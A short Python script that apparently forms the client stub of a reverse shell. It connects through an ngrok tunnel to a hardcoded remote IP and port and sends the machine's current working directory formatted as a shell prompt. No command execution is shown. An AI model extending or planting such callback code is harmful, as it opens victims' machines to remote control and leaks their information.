"""
design@asij

"""

import os
import socket


# If the free version of ngrok is used, the port will change each time ngrok is activated
# IP address was found through nslookup 0.tcp.jp.ngrok.io on terminal
address = "57.181.84.1" # address
port = 18642 # port 


# Handles the connection of the client 
def connectClient():
  # Creates a socket object as clientSocket
  with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as clientSocket:
    # Connect to server
    clientSocket.connect((address, port))

    clientSocket.send(f"/{os.getcwd()}: ".encode("utf-8"))







if __name__ == "__main__":
  connectClient()
